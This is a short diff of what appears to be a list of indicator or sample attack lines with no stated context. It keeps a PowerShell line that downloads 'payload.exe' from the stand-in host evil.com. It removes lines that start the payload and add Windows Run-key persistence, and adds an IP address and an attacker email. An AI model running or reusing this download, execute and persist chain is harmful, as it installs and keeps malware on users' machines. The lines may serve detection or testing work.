@@ -1,9 +1,7 @@
-﻿powershell.exe
+powershell.exe
 
 Invoke-WebRequest https://evil.com/payload.exe
 
-Start-Process payload.exe
+10.10.10.10
 
-New-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
-
-Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+attacker@gmail.com
